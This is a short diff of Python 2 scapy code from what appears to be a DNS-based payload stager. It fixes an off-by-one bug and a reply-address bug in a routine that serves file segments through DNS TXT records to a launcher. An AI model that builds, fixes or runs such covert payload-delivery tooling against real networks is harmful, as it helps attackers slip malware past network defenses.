@@ -703,7 +703,7 @@ def send_message(packets=None):
             hostname = str(txt_dns[DNSQR].qname)
             recv_counter = int(filter(str.isdigit, hostname))    
 
-            if recv_counter > len(file_array):
+            if recv_counter > len(file_array)-1:
                 self.stop_data_transfer(sock, txt_addr[0], txt_addr[1], txtstoptransfer, hostname, s2_reply_id)
                 break
             else:
@@ -713,7 +713,7 @@ def send_message(packets=None):
                     an=DNSRR(rrname=str(hostname), type='TXT', rdata=file_array[recv_counter], ttl=300))
 
                 print "send_payload_via_txt - sending segment {} to hostname {}".format(recv_counter, hostname)
-                sock.sendto(bytes(txt_snd), s2_addr)
+                sock.sendto(bytes(txt_snd), txt_addr)
         
     # Stage 1
     def trigger_staging(self, sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd):
